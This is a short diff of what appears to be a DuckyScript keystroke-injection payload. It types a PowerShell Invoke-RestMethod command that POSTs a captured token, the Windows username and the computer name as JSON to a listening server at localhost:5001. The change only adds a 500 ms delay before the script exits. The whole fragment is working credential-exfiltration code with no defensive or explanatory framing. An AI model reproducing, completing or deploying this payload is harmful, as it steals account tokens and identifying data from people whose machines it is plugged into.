@@ -24,5 +24,6 @@ $username = $env:USERNAME
 $computername = $env:COMPUTERNAME
 STRING Invoke-RestMethod -Uri "http://localhost:5001" -Method POST -Headers @{ "Content-Type" = "application/json" } -Body (ConvertTo-Json @{content = $token; username = $username; computer = $computername})
 ENTER
+DELAY 500
 STRING exit
 ENTER
